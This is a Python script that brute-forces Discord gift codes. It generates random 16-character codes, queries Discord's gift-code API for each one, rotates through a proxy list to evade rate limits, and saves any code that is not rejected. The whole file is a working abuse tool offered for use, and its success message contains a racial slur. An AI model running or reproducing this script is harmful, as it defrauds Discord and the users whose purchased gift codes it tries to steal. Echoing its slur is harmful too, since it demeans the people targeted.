import requests
from itertools import cycle
import random
key_len = 16
key_red = 'https://discord.gift/'
print('Written by Qiwi1232, feel free to send me an extra key if you get a bunch :P')
def save(text):
    cfg = open("validKeys.txt", "a+")
    cfg.write(text + '\n')

def loadProxies():
    prx = open("proxies.txt", "r")
    lines = [line.strip() for line in prx]
    #proxies = {'http': [], 'https': []}
    #for line in lines:
        #ip_port = line.split(':')
        #ip, port = (ip_port[0], ip_port[1]) if len(ip_port) > 1 else (ip_port[0], 80)
        #scheme = 'http'
        #proxies[scheme].append(''.join([scheme, '://', ip, ':', port]))
    return lines

def code():
    charset = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    guess = []
    for i in range(key_len):
        luckyChar = random.choice(charset)
        guess.append(luckyChar)
        code = ''.join(guess)
    return code

prox = loadProxies()
proxGroup = cycle(prox)

while True:
    key = code()
    proxy = next(proxGroup)
    data = ''
    try:
        r = requests.get('https://discordapp.com/api/v6/entitlements/gift-codes/' + key + '?with_application=false&with_subscription_plan=true', proxies={"https": proxy})
        data = r.json().get("message")
                
        if data == "Unknown Gift Code":
            print(key + ' is invalid')
            key = code()
            
        if data == "You are being rate limited.":
            print('rate limited')
            proxy = next(proxGroup)
            
        if data != "Unknown Gift Code" and data != "You are being rate limited.":
            save(key)
            print('damn nigga u did it https://discord.gift/' + key)
            key = code()

    except:
        print("Proxy Error")
        proxy = next(proxGroup)
